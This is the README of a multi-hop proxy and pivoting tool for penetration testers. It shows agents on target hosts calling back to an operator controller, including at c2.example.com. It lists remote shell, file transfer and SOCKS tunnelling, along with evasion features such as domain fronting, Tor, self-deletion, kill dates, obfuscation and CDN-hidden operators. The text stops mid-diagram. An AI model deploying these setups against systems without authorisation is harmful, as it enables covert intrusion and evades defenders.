# Shroud

Shroud is a multi-hop proxy tool for security researchers and penetration testers.

Shroud lets you proxy external traffic through multiple hops into a target internal network, bypassing access restrictions, building a tree-like node topology, and managing it easily.

**Please be sure to read the usage guide and the notes at the end before using.**

## Architecture Overview

```
                                    ┌─────────────────────────────────────────┐
                                    │           Operator Workstation          │
                                    │                                         │
                                    │   ┌──────────────────────────────────┐  │
                                    │   │         Admin Controller         │  │
                                    │   │  ┌────────┐ ┌────────────────┐   │  │
                                    │   │  │Topology│ │ Identity Store │   │  │
                                    │   │  │Manager │ │(Argon2id+GCM)  │   │  │
                                    │   │  └────────┘ └────────────────┘   │  │
                                    │   │  Interactive CLI / Script Mode   │  │
                                    │   │  SOCKS5 Listener / Port Forward  │  │
                                    │   └──────────────┬───────────────────┘  │
                                    └──────────────────┼──────────────────────┘
                                                       │
                          ┌────────────────────────────┼────────────────────────────┐
                          │ Transport Options:                                      │
                          │   Raw TCP │ WebSocket │ TLS │ Tor │ SSH Tunnel           │
                          │   + Traffic Padding (--pad-size)                         │
                          │   + Domain Fronting (--front-domain)                     │
                          └────────────────────────────┼────────────────────────────┘
                                                       │
                                          Link Encrypted (ECDH+AES-GCM)
                                          E2E Encrypted (per-peer ECDH)
                                          Command Signed (Ed25519)
                                                       │
                          ┌────────────────────────────▼────────────────────────────┐
                          │                                                         │
               ┌──────────▼──────────┐                              ┌───────────────▼──────────┐
               │   Agent Node 0      │                              │   (Future Agent via       │
               │   (DMZ / Edge)      │                              │    listen/connect)        │
               │                     │                              └──────────────────────────┘
               │  Route Table:       │
               │  {dest→nextHop}     │
               │                     │
               │  Features:          │
               │  · Silent (-v off)  │
               │  · Sleep Mask       │
               │  · mlock keys       │
               │  · Anti-coredump    │
               └───────┬─────────┬───┘
                       │         │
          ┌────────────▼┐   ┌───▼────────────┐
          │ Agent Node 1│   │ Agent Node 2   │
          │ (Office Net)│   │ (Branch)       │
          │             │   │                │
          │ Route Table │   │ --kill-date    │
          │ {dest→next} │   │ --work-hours   │
          │             │   │ --self-delete  │
          └──────┬──────┘   └────────────────┘
                 │
          ┌──────▼──────┐
          │ Agent Node 3│
          │ (Core Zone) │
          │             │
          │ SOCKS5 ◄────┼── Operator proxies traffic here
          │ Port Fwd    │
          │ Shell/SSH   │
          │ File Xfer   │
          └─────────────┘
```

### Encryption Layers

```
┌─────────────────────────────────────────────────────────────────┐
│                        Wire Frame                               │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Layer 1: TLS (optional)          -- transport encryption │  │
│  │  ┌─────────────────────────────────────────────────────┐  │  │
│  │  │  Layer 2: LinkKey (ECDH+HKDF)  -- per-hop frame enc │  │  │
│  │  │  ┌───────────────────────────────────────────────┐  │  │  │
│  │  │  │  Header: Sender│Accepter│Type│Route│DataLen   │  │  │  │
│  │  │  ├───────────────────────────────────────────────┤  │  │  │
│  │  │  │  Layer 3: CryptoKey (AES-256-GCM) -- payload  │  │  │  │
│  │  │  │  ┌─────────────────────────────────────────┐  │  │  │  │
│  │  │  │  │  Layer 4: E2E Key (per-peer ECDH)       │  │  │  │  │
│  │  │  │  │  ┌───────────────────────────────────┐  │  │  │  │  │
│  │  │  │  │  │  Layer 5: Command Signature       │  │  │  │  │  │
│  │  │  │  │  │  (Ed25519 + seq + timestamp)      │  │  │  │  │  │
│  │  │  │  │  │  [actual command/data payload]    │  │  │  │  │  │
│  │  │  │  │  └───────────────────────────────────┘  │  │  │  │  │
│  │  │  │  └─────────────────────────────────────────┘  │  │  │  │
│  │  │  │  [padding if --pad-size set]                  │  │  │  │
│  │  │  └───────────────────────────────────────────────┘  │  │  │
│  │  └─────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### Next-Hop Routing vs Source Routing

```
Source Routing (old): Intermediate nodes see the full path
  Admin ──► Agent0 ──► Agent1 ──► Agent2
  Header.Route = "Agent0:Agent1:Agent2"    ← Agent0 sees all downstream nodes

Next-Hop Routing (new): Intermediate nodes only know the next hop
  Admin distributes routing tables to each Agent:
    Agent0's table: {Agent1→Agent1, Agent2→Agent1}
    Agent1's table: {Agent2→Agent2}

  Admin ──► Agent0 ──► Agent1 ──► Agent2
  Header.Route = ""                        ← Agent0 looks up routing table → nextHop=Agent1
                                             Agent0 does not know about Agent2's path
```

### Agent Lifecycle

```
Start ──► Enroll/Cert Auth ──► Normal Operation ──► [Event] ──► Exit
  │                                  │                 │
  │  -s secret (first time)          │                 ├─ SHUTDOWN cmd → cleanShutdown()
  │  Certificate (subsequent)        │                 ├─ --kill-date expired → selfDestruct()
  │                                  │                 ├─ Disconnected (no reconnect) → cleanShutdown()
  │                                  │                 └─ Ctrl+C / kill → cleanShutdown()
  │                                  │
  │                             ┌────▼─────┐         cleanShutdown():
  │                             │  Message  │           1. WipeSeeds() zero keys
  │                             │  Loop     │◄──┐      2. Wipe(LinkKey/CryptoKey)
  │                             └────┬─────┘   │      3. --self-delete? → overwrite+delete binary
  │                                  │         │      4. os.Exit(0)
  │                             Disconnected   │
  │                                  │         │
  │                             ┌────▼─────┐   │
  │                             │ Reconnect│   │
  │                             │ Exp.Back │   │
  │                             │ +Jitter  │   │
  │                             │          │   │
  │                             │ --sleep  │   │
  │                             │ -mask?   │   │
  │                             │ Encrypt  │   │
  │                             │ memory   │   │
  │                             └────┬─────┘   │
  │                                  │ success │
  │                                  └─────────┘
  │
  │  --work-hours 09:00-18:00
  │  └─ Outside window → sleep until next work start
  │
  │  --kill-date 2026-07-01
  │  └─ Checked every 60s → expired → selfDestruct()
```

## Disclaimer:

> This project is intended for cybersecurity research and educational purposes only. Any unauthorized or malicious use is strictly prohibited. Before conducting any testing, please ensure you have explicit authorization from the target system and fully comply with all applicable laws and regulations in your country or region.
The user assumes full responsibility for any direct or indirect consequences resulting from the use of this tool, including but not limited to data loss, system damage, or legal issues. The author of this project does not accept any liability for misuse or illegal use of this tool.
By using this tool, you acknowledge that you have read, understood, and agreed to the full contents of this disclaimer.

## Features & Security

**Core Functionality**

- Interactive CLI (`admin`): Tab command completion, arrow-key history navigation, multi-level panel switching
- Topology management (`topo`): tree view of all online nodes and parent-child relationships
- Node information (`detail`): displays IP, hostname, username, and memo for each node
- Forward connection (`connect`): instruct current node to actively connect to a child node
- Reverse connection (`listen`): instruct current node to listen on a port and wait for child nodes
- Auto-reconnection (`--reconnect <seconds>`): exponential backoff + random jitter after disconnect, capped at 5 minutes
- Proxy egress (`--socks5-proxy`/`--http-proxy`): connect between nodes through SOCKS5 or HTTP proxies
- SSH tunnel (`sshtunnel`): add nodes to the network through existing SSH credentials, traffic appears as SSH
- Transport protocol (`--up`/`--down`): raw TCP (`raw`) or WebSocket (`ws`) between nodes
- Multi-hop SOCKS5 (`socks <port>`): opens SOCKS5 on Admin locally, traffic tunneled through the node chain, supports TCP/UDP and IPv4/IPv6
- SSH remote access (`ssh <ip:port>`): SSH to target hosts through nodes, password or certificate auth
- Remote shell (`shell`): interactive shell on current node, `--cs gbk` for GBK-encoded platforms
- File transfer (`upload`/`download`): upload and download files with real-time progress bar
- Port mapping (`forward`/`backward`): forward maps Admin local port to remote, backward maps Agent port to Admin local
- Port reuse (`--rehost`/`--report`): SO_REUSEPORT mode (Windows/macOS/Linux) and IPTABLES mode (Linux, requires root)
- Service management (`stopsocks`/`stopforward`/`stopbackward`): start and stop proxy/mapping services at any time
- Multi-platform build (`make all`): Linux/macOS/Windows/MIPS/ARM/FreeBSD across 9 targets, CGO_ENABLED=0 static binaries
- Node shutdown (`shutdown`): remotely terminate a specific node from the Admin console

**Encryption & Authentication**

- One-time enrollment (`-s <secret>`): HMAC challenge-response mutual auth on first connect, Admin CA then auto-issues Ed25519 certificates for all subsequent connections
- Five-layer encryption: TLS (optional `--tls-enable`) → LinkKey (X25519 ECDH+HKDF per-hop frame encryption) → CryptoKey (AES-256-GCM payload encryption) → E2E (per-peer ECDH end-to-end encryption) → Command Signing (Ed25519 + sequence number + 5-minute time window)
- TLS fingerprint pinning (`--tls-fingerprint <sha256>`): prints peer certificate fingerprint on first connect, verifies consistency on subsequent connections
- Identity file encryption (`--passphrase <passphrase>`): Argon2id key derivation (time=3, mem=64KB) + AES-256-GCM encrypted storage, also configurable via `SHROUD_PASSPHRASE` env var
- CA key separation (`--ca-file <path>`): CA root key can be stored offline, mounted only when issuing certificates

**Anonymity & Stealth**

- Tor anonymous connection (`--tor-proxy <address>`): inter-node traffic routed through Tor, DNS resolved at Tor exit node with no local leakage
- Tor hidden service (`--tor-hidden`): Agent runs as a .onion service without a public IP, managed via `--tor-control` and `--tor-control-password`
- Runtime transport switching (`transport tor`/`transport raw`): dynamically switch between raw TCP and Tor transport from the Admin console without disconnecting
- Tor circuit renewal (`newcircuit`): request a new Tor circuit for the current node, changing the exit IP
- Domain fronting (`--front-domain <domain>`): spoof WebSocket Host header to a CDN domain, TLS SNI separated from actual target
- User-Agent rotation (`--user-agent "UA1|UA2|..."`): pipe-separated UAs, crypto/rand random selection per request
- Custom Origin header (`--origin <url>`): replace the default WebSocket Origin value
- Traffic padding (`--pad-size <bytes>`): pad message frames to specified block-size multiples (e.g. 4096), prevents traffic size analysis
- Heartbeat keepalive (`--heartbeat`): 10s base interval + 0-6s crypto/rand random offset, maintains reverse-proxy long connections and prevents timing analysis

**Anti-Forensics & OPSEC**

- Next-hop routing (automatic): Admin distributes routing tables (`destination→next-hop`) to each Agent, intermediate nodes only know direct neighbors, cannot enumerate the network
- Dynamic UUIDs (automatic): Admin/Agent UUIDs derived from key SHA256 at runtime, no hardcoded identifiers in the binary
- Identity path hiding (automatic, `--identity-dir` to override): storage directory derived from key SHA256 (not fixed `.shroud/`), existing deployments auto-compatible
- iptables chain name hiding (automatic): port-reuse chain names derived from key SHA256 with prefix `CT`+6-char hex (not a fixed string)
- Silent mode (`-v` to enable logging): Agent produces no output by default, no connection or node info leaked
- Argument scrubbing (automatic): `-s` and `--passphrase` wiped from process argument list after startup, invisible in `/proc/cmdline`
- Anti-core-dump (automatic): Linux `prctl(PR_SET_DUMPABLE,0)` / Windows `SetErrorMode(SEM_*)` / macOS `PT_DENY_ATTACH`+`RLIMIT_CORE=0`
- mlock key pages (automatic): key memory pages locked to prevent swapping to disk, covers Linux/Windows/macOS
- Key zeroing (automatic): LinkKey, CryptoKey, PreAuthToken and other key material zeroed on exit and after use
- Sleep masking (`--sleep-mask`): encrypts key material with an ephemeral key during reconnect waits, zeroes the originals
- KillDate (`--kill-date <YYYY-MM-DD>`): auto-wipes keys, deletes identity files, and exits on expiry, checked every 60 seconds
- Working hours (`--work-hours <HH:MM-HH:MM>`): auto-sleeps outside the window, zero traffic and zero connections
- Agent self-delete (`--self-delete`): overwrites binary with random data then deletes on exit (Windows uses delayed deletion)
- Binary obfuscation (`make obfuscated`): garble build with `-literals -tiny -seed=random`, obfuscates strings and symbols

## Build

- Use `make` to directly compile programs for multiple platforms, or refer to the Makefile for compiling specific programs.

## Quick Start

The following commands quickly start the simplest Shroud setup:

- admin: `./shroud_admin -l 9999 -s 123`
- agent: `./shroud_agent -c <shroud_admin's IP>:9999 -s 123`

### About the `-s` Secret

`-s` is a **one-time enrollment bootstrap secret**, used only when an Agent connects for the first time. Both Admin and Agent must use the same value for HMAC challenge-response mutual authentication. Once authenticated, the Admin CA automatically issues an Ed25519 certificate for that Agent. All subsequent connections (including reconnects) use certificate-based auth and no longer depend on this secret.

**Requirements:** Any string, no length limit. For production use, generate a strong random value:

```bash
# Linux/macOS — generate a 32-character random secret
openssl rand -base64 24

# Or use /dev/urandom
head -c 24 /dev/urandom | base64

# Windows PowerShell
[Convert]::ToBase64String((1..24 | ForEach-Object { Get-Random -Max 256 }) -as [byte[]])
```

**The values `123` and `mysecret` in examples are for demonstration only. Always use a randomly generated strong secret in real deployments.**

## Usage

### Roles

Shroud has two roles:
- `admin`  The controller used by the operator
- `agent`  The node deployed on a target host

### Noun definition

- Node: Either `admin` or `agent`
- Active mode: The current node actively connects to another node
- Passive mode: The current node listens on a specific port and waits for another node to connect
- Upstream: Traffic between the current node and its parent node
- Downstream: Traffic between the current node and **all** of its child nodes

### Parameter analysis

- admin

```
Parameter:
-l Listening address in passive mode [ip]:<port>
-s one-time enrollment bootstrap secret (required for first certificate issuance; enrolled nodes reconnect with certificates)
-c Target node address under active mode
--socks5-proxy SOCKS5 proxy server address
--socks5-proxyu SOCKS5 proxy server username
--socks5-proxyp SOCKS5 proxy server password
--http-proxy HTTP proxy server address
--down Downstream protocol type, default is raw TCP traffic, optional WS (WebSocket)
--tls-enable Enable TLS for node communication
--tls-fingerprint Expected TLS certificate SHA256 fingerprint for pinning
--domain Specify the TLS SNI/WebSocket domain name. If it is empty, it defaults to the target node address
--heartbeat Enable heartbeat packets
--tor-proxy Tor SOCKS5 proxy address (e.g. 127.0.0.1:9050)
--passphrase Passphrase for encrypting identity files (or set SHROUD_PASSPHRASE env var)
--identity-dir Identity file storage directory (optional, defaults to derived path)
--ca-file Offline CA key file path (optional, for certificate issuance)
--pad-size Traffic padding block size (optional, e.g. 4096; must match on both sides)
```

- agent

```
Parameter:
-l Listening address in passive mode [ip]:<port>
-s one-time enrollment bootstrap secret (required only for first enrollment)
-c Target node address under active mode
--socks5-proxy SOCKS5 proxy server address
--socks5-proxyu SOCKS5 proxy server username (optional)
--socks5-proxyp SOCKS5 proxy server password (optional)
--http-proxy HTTP proxy server address
--reconnect Reconnect time interval
--rehost The IP address to be reused
--report The port number to be reused
--up Upstream protocol type, default is raw TCP traffic, optional WS (WebSocket)
--down Downstream protocol type, default is raw TCP traffic, optional WS (WebSocket)
--cs Console encoding (default: utf-8; optional: gbk)
--tls-enable Enable TLS for node communication
--tls-fingerprint Expected TLS certificate SHA256 fingerprint for pinning
--domain Specify the TLS SNI/WebSocket domain name. If it is empty, it defaults to the target node address.
--tor-proxy Tor SOCKS5 proxy address (e.g. 127.0.0.1:9050)
--tor-hidden Start as Tor hidden service
--tor-control Tor control port address (default 127.0.0.1:9051)
--tor-control-password Tor control port password
-v Enable verbose logging (default: silent)
--passphrase Passphrase for encrypting identity files (or set SHROUD_PASSPHRASE env var)
--identity-dir Identity file storage directory (optional)
--pad-size Traffic padding block size (optional, e.g. 4096; must match on both sides)
--sleep-mask Enable sleep masking (encrypts keys in memory during reconnection idle)
--kill-date Auto-destruct date (format: 2026-07-01; wipes keys and exits on expiry)
--work-hours Active hours window (format: 09:00-18:00; sleeps outside this window)
--self-delete Securely delete own binary and identity files on exit
--user-agent Custom User-Agent strings (pipe-separated, randomly rotated per request)
--front-domain Domain fronting Host header (for WebSocket mode)
--origin Custom Origin header (for WebSocket mode, replaces default)
```

### Parameter usage

#### -l

This parameter can be used on admin&&agent, under passive mode 

If you do not specify an IP address, it will default to listening on `0.0.0.0`

- admin:  `./shroud_admin -l 9999 -s 123` or `./shroud_admin -l 127.0.0.1:9999 -s 123`

- agent:  `./shroud_agent -l 9999 -s 123`  or `./shroud_agent -l 127.0.0.1:9999 -s 123`

#### -s

This parameter can be used on admin&&agent, under both active && passive mode

This parameter is the first-connect enrollment bootstrap secret. It authorizes certificate issuance once; after the node certificate is stored, reconnects use certificate authentication and payload protection uses link/E2E keys derived from node identity, not the bootstrap secret.

- admin:  `./shroud_admin -l 9999 -s 123`

- agent:  `./shroud_agent -l 9999 -s 123`

#### -c

This parameter can be used on admin&&agent, under active mode 

It represents the address of the node you wish to connect to

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123` 

#### --socks5-proxy/--socks5-proxyu/--socks5-proxyp/--http-proxy

> **Do not confuse** with the `socks` command. These parameters let Agent/Admin **connect through a corporate proxy** to reach their parent node. The `socks` command opens a local SOCKS5 listener for the **Operator's tools** — see "Proxy Usage Guide" below.

These four parameters can be used on admin&&agent , under active mode

`--socks5-proxy` represents the address of the socks5 proxy server, `--socks5-proxyu` and `--socks5-proxyp` are optional

`--http-proxy` represents the address of the http-proxy server, the usage is the same as socks5

Without username and password:

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx`

Require username and password:

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx --socks5-proxyu xxx --socks5-proxyp xxx`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --socks5-proxy xxx.xxx.xxx.xxx --socks5-proxyu xxx --socks5-proxyp xxx`

#### --up/--down

These two parameters can be used on admin&&agent, under active && passive mode

However, note that there is no `--up` parameter on the admin

These two parameters are optional. If left empty, upstream/downstream traffic will use raw TCP.

If you wish for the upstream/downstream traffic to use WebSocket, set these parameters to `ws`

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --down ws` 

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --up ws`  or `./shroud_agent -c 127.0.0.1:9999 -s 123 --up ws --down ws`

Note: once you set the upstream/downstream traffic of a node to WS, the downstream/upstream traffic of its parent/child nodes must match.

- admin:  `./shroud_admin -c 127.0.0.1:9999 -s 123 --down ws`

- agent:  `./shroud_agent -l 9999 -s 123 --up ws`

In this case, the agent must set `--up` to `ws`, otherwise it will cause network errors.

The rules between admin<-->agent are the same as agent<-->agent.

Assuming agent-1 is waiting for the connection of child nodes on the port `127.0.0.1:10000` and has set `--down ws`

Then, agent-2 must also set `--up` to `ws`, otherwise it will lead to network errors.

- agent-2:  `./shroud_agent -c 127.0.0.1:10000 -s 123 --up ws`

If you need a reverse proxy such as Nginx, use the WebSocket (`ws`) transport with TLS.

#### --reconnect

This parameter can be used on the agent, under active mode.

This parameter is optional. If not set, the node will not automatically reconnect after a network disconnection. If set, the node will try to reconnect to its parent every x seconds (the number of seconds you set).

- admin:  `./shroud_admin -l 9999 -s 123`

- agent:  `./shroud_agent -c 127.0.0.1:9999 -s 123 --reconnect 10`

In this scenario, if the connection between the agent and the admin is interrupted, the agent will attempt to reconnect to the admin every ten seconds.

The rules between admin<-->agent are the same as agent<-->agent

Additionally, `--reconnect` can be used together with `--socks5-proxy`, `--socks5-proxyu`, `--socks5-proxyp`, or `--http-proxy`. In that case, the agent will attempt to reconnect through the proxy using the settings specified at startup.

#### --rehost/--report

These two parameters are used exclusively on the agent side. For details, see the port reuse section below.

#### --cs

This parameter can be used on the agent, under both active and passive mode.

This is mainly to fix garbled output in the `shell` feature. If the agent runs on a system whose console encoding is GBK (commonly Windows) while the admin runs with UTF-8 console encoding, you should set this parameter to `gbk`.

- Windows: `./shroud_agent -c 127.0.0.1:9999 -s 123 --cs gbk`

#### --tls-enable

This parameter can be used on both admin and agent, under both active and passive mode.

By setting this option, traffic between nodes can be encrypted with TLS

- admin: `./shroud_admin -l 10000 --tls-enable -s 123`
- agent: `./shroud_agent -c localhost:10000 --tls-enable -s 123`

When enabled, TLS provides transport-layer encryption. AES-256-GCM encryption remains active, providing defense-in-depth.

When this parameter is enabled, **ensure that every node in the network (including the admin) has this parameter enabled**

You can use `--tls-fingerprint` to specify the expected TLS certificate fingerprint for certificate pinning. On first connection, the peer's certificate fingerprint is printed for your records.

#### --domain

This parameter can be used on both admin and agent, under active mode.

This option lets you specify the TLS SNI name or the WebSocket host/domain name for the current node.

- admin: `./shroud_admin -l 10000 --tls-enable -s 123`
- agent: `./shroud_agent -c xxx.xxx.xxx.xxx:10000 --tls-enable -s 123 --domain xxx.com`

#### --heartbeat

This parameter can be used on the admin, under both active and passive mode.

When enabled, the admin continuously sends heartbeat packets to the first node, keeping the connection alive even when a reverse proxy sits in between.

Assuming there are reverse proxy devices similar to NGINX between the admin and agent, proxying port 8080 to port 8000, an example is as follows:
- admin: `./shroud_admin -l 8000 --tls-enable -s 123 --down ws --heartbeat`
- agent: `./shroud_agent -c xxx.xxx.xxx.xxx:8080 --tls-enable -s 123 --domain xxx.com --up ws`

#### --tor-proxy

This parameter can be used on both admin and agent, under active mode.

It specifies the address of a Tor SOCKS5 proxy to route the outgoing connection through the Tor network.

- admin: `./shroud_admin -c <target>:9999 --tor-proxy 127.0.0.1:9050`
- agent: `./shroud_agent -c <target>:9999 --tor-proxy 127.0.0.1:9050`

#### --tor-hidden/--tor-control/--tor-control-password

These three parameters are used exclusively on the agent side.

`--tor-hidden` instructs the agent to start as a Tor hidden service, automatically registering a `.onion` address through the Tor control port.

`--tor-control` specifies the Tor control port address. The default is `127.0.0.1:9051`.

`--tor-control-password` specifies the password for the Tor control port.

- agent: `./shroud_agent --tor-hidden --tor-control 127.0.0.1:9051 --tor-control-password mypassword -s 123`

When started, the agent will print its `.onion` address. The admin (or a parent agent) can then connect via Tor:

- admin: `./shroud_admin -c <onion_address>.onion:port --tor-proxy 127.0.0.1:9050 -s 123`

## Deployment Examples

The following covers common deployment scenarios. The `-s` secret is only used for initial enrollment; subsequent connections use certificate authentication automatically.

### Scenario 1: Direct Connection (Admin Passive, Agent Active)

Simplest topology — Admin listens, Agent connects in.

```
Operator                        Target Host
┌──────────┐     TCP:9999      ┌──────────┐
│  Admin   │◄──────────────────│  Agent   │
│ -l 9999  │                   │ -c IP:99 │
└──────────┘                   └──────────┘
```

```bash
# Operator
./shroud_admin -l 9999 -s mysecret

# Target
./shroud_agent -c <admin_ip>:9999 -s mysecret
```

### Scenario 2: Reverse Connection (Agent Passive, Admin Active)

Agent listens first, Admin connects to it. Useful when the target allows inbound but the operator does not.

```
Operator                        Target Host
┌──────────┐     TCP:8443      ┌──────────┐
│  Admin   │──────────────────►│  Agent   │
│ -c IP:84 │                   │ -l 8443  │
└──────────┘                   └──────────┘
```

```bash
# Target (start first)
./shroud_agent -l 8443 -s mysecret

# Operator
./shroud_admin -c <agent_ip>:8443 -s mysecret
```

### Scenario 3: Multi-Hop Proxy Chain

Admin → Agent-0 (DMZ) → Agent-1 (Office) → Agent-2 (Core), then open SOCKS5 on Agent-2.

```
Operator          DMZ             Office           Core
┌──────┐       ┌────────┐      ┌────────┐      ┌────────┐
│Admin │◄──────│Agent-0 │◄─────│Agent-1 │◄─────│Agent-2 │
│-l 999│       │-c :9999│      │-l 10000│      │-l 10001│
└──────┘       └────────┘      └────────┘      └────────┘
  │                                                 │
  │◄──── SOCKS5 :7777 ─────── tunneled ────────────►│
```

```bash
# 1. Operator starts Admin
./shroud_admin -l 9999 -s mysecret

# 2. DMZ starts Agent-0, connects to Admin
./shroud_agent -c <admin_ip>:9999 -s mysecret

# 3. Admin console — tell Agent-0 to listen for child nodes
(admin) >> use 0
(node 0) >> listen
# Choose 1.Normal Passive, enter port 10000

# 4. Office starts Agent-1, connects to Agent-0
./shroud_agent -c <agent0_ip>:10000 -s mysecret

# 5. Admin console — tell Agent-1 to listen for child nodes
(admin) >> use 1
(node 1) >> listen
# Choose 1.Normal Passive, enter port 10001

# 6. Core starts Agent-2, connects to Agent-1
./shroud_agent -c <agent1_ip>:10001 -s mysecret

# 7. Open SOCKS5 on Agent-2
(admin) >> use 2
(node 2) >> socks 7777
# Local 127.0.0.1:7777 now proxies into the core zone
```

### Scenario 4: Egress Through Corporate Proxy

Agent is behind a network that only allows outbound via HTTP/SOCKS5 proxy.

```
Target Host          Corporate Proxy        Operator
┌──────────┐        ┌──────────────┐       ┌──────────┐
│  Agent   │──────►│  HTTP Proxy   │─────►│  Admin   │
│          │       │  10.0.0.1:808 │       │ -l 443   │
└──────────┘        └──────────────┘       └──────────┘
```

```bash
# Operator
./shroud_admin -l 443 -s mysecret --down ws --tls-enable

# Target (via HTTP proxy)
./shroud_agent -c <admin_domain>:443 -s mysecret \
  --http-proxy 10.0.0.1:8080 --up ws --tls-enable --reconnect 30

# Or via SOCKS5 proxy (with auth)
./shroud_agent -c <admin_domain>:443 -s mysecret \
  --socks5-proxy 10.0.0.1:1080 --socks5-proxyu user --socks5-proxyp pass \
  --up ws --tls-enable --reconnect 30
```

### Scenario 5: WebSocket + TLS + Nginx Reverse Proxy

Disguise traffic as normal HTTPS, forwarded through Nginx.

```
Target Host              CDN/Nginx               Operator
┌──────────┐           ┌───────────┐           ┌──────────┐
│  Agent   │──────────►│  Nginx    │──────────►│  Admin   │
│  --up ws │  TLS:443  │  :443→800 │  WS:8000  │ -l 8000  │
│--tls-enab│           │           │           │ --down ws│
└──────────┘           └───────────┘           └──────────┘
```

Nginx config:
```nginx
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate     /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400s;
    }
}
```

```bash
# Operator
./shroud_admin -l 8000 -s mysecret --down ws --heartbeat

# Target
./shroud_agent -c c2.example.com:443 -s mysecret \
  --up ws --tls-enable --domain c2.example.com --reconnect 30
```

### Scenario 6: Tor Anonymous Connection

Route traffic through the Tor network to hide both parties' real IPs.

```
Operator                  Tor Network              Target Host
┌──────────┐           ┌─────────────┐           ┌──────────┐
│  Admin   │──────────►│  Guard →    │──────────►│  Agent   │
│--tor-prox│  SOCKS5   │  Middle →   │           │ -l 9999  │
│ y :9050  │  :9050    │  Exit       │           │          │
└──────────┘           └─────────────┘           └──────────┘
```

```bash
# Target (start first)
./shroud_agent -l 9999 -s mysecret

# Operator (connect via Tor)
./shroud_admin -c <agent_ip>:9999 -s mysecret --tor-proxy 127.0.0.1:9050
```

### Scenario 7: Tor Hidden Service

Agent runs as an .onion hidden service — no public IP needed, both IPs invisible.

```
Operator                  Tor Network              Target Host
┌──────────┐           ┌─────────────┐           ┌──────────┐
│  Admin   │◄─────────►│ Rendezvous  │◄─────────►│  Agent   │
│--tor-prox│           │  Point      │           │--tor-hidd│
│ y :9050  │           │             │           │ en       │
└──────────┘           └─────────────┘           └──────────┘
                       xxx...xxx.onion
```

```bash
# Target (start as Tor hidden service)
./shroud_agent --tor-hidden --tor-control 127.0.0.1:9051 \
  --tor-control-password torpass -s mysecret
# Output: [*] Tor hidden service: xxxxxxxxxxxx.onion:xxxxx

# Operator (connect to .onion address via Tor)
./shroud_admin -c xxxxxxxxxxxx.onion:<port> -s mysecret \
  --tor-proxy 127.0.0.1:9050
```

### Scenario 8: SSH Tunnel

Use existing SSH credentials to tunnel a new node into the network, disguising traffic as SSH.

```
Admin ◄──── Agent-0 ════SSH════ Target Host(Agent-1)
                    sshtunnel     Agent-1 -l 10000
                    :22 → :10000
```

```bash
# Target: start Agent-1 listening
./shroud_agent -l 10000 -s mysecret

# Admin console: connect Agent-1 through Agent-0's SSH tunnel
(admin) >> use 0
(node 0) >> sshtunnel <target_ip>:22 10000
# Enter SSH username/password or certificate path
# Agent-1 joins the network as a child of Agent-0
```

### Scenario 9: Port Reuse (Reusing Web Service Port 80)

Agent reuses an existing port 80, blending with normal web traffic.

```
Operator                        Target Host (HTTP:80 running)
┌──────────┐     TCP:80        ┌──────────────────┐
│  Admin   │──────────────────►│  Agent (reuse:80) │
│ -c IP:80 │                   │  HTTP unaffected   │
└──────────┘                   └──────────────────┘
```

**SO_REUSEPORT mode** (Windows/macOS/Linux):
```bash
# Target (reuse port 80)
./shroud_agent --report 80 --rehost 192.168.0.105 -s mysecret

# Operator
./shroud_admin -c 192.168.0.105:80 -s mysecret
```

**IPTABLES mode** (Linux only, requires root):
```bash
# Target (reuse port 22, actually listen on 10000)
./shroud_agent --report 22 -l 10000 -s mysecret

# Activate reuse script
python reuse.py --start --rhost <agent_ip> --rport 22

# Operator
./shroud_admin -c <agent_ip>:22 -s mysecret
```

### Scenario 10: Full OPSEC Deployment

Combine all stealth features: WS+TLS, domain fronting, traffic padding, heartbeat jitter, KillDate, work hours, self-delete, sleep encryption.

```bash
# Operator (Admin)
./shroud_admin -l 443 -s <secret> \
  --down ws --tls-enable --heartbeat \
  --passphrase <pass> --pad-size 4096

# Target (Agent - maximum stealth)
./shroud_agent -c <c2_domain>:443 -s <secret> \
  --up ws --tls-enable \
  --reconnect 30 \
  --front-domain cdn.example.com \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
  --passphrase <pass> --pad-size 4096 \
  --sleep-mask --self-delete \
  --kill-date 2026-07-15 \
  --work-hours 09:00-18:00
```

Parameter summary:

| Parameter | Purpose |
|-----------|---------|
| `--up ws --tls-enable` | WebSocket + TLS, traffic looks like HTTPS |
| `--front-domain` | Host header spoofed to CDN domain |
| `--user-agent` | Random UA per request |
| `--pad-size 4096` | Pad frames to 4KB multiples, prevents size analysis |
| `--reconnect 30` | 30s base reconnect interval (auto exponential backoff + jitter) |
| `--sleep-mask` | Encrypt keys in memory during reconnect waits |
| `--self-delete` | Overwrite and delete binary on exit |
| `--kill-date` | Auto-cleanup and exit on expiry |
| `--work-hours` | Active only during work hours, zero traffic otherwise |
| `--passphrase` | Encrypt identity files on disk |

### Scenario 11: CDN Protection for Admin's Real IP

Hide the Admin behind a CDN (e.g., Cloudflare). Agents only know the CDN domain and can never discover the Admin's real IP. Even if an Agent is compromised, the attacker cannot locate the Operator workstation.

```
Target Host              CDN (Cloudflare)           Nginx (Origin)         Operator
┌──────────┐           ┌───────────────┐          ┌────────────┐        ┌──────────┐
│  Agent   │──────────►│  CDN Edge     │─────────►│  Nginx     │───────►│  Admin   │
│  --up ws │  TLS:443  │  c2.example.  │  Origin  │  :443→8000 │ WS:80 │ -l 8000  │
│--tls-enab│           │  com          │  Pull    │  127.0.0.1 │  00   │ --down ws│
└──────────┘           └───────────────┘          └────────────┘        └──────────┘
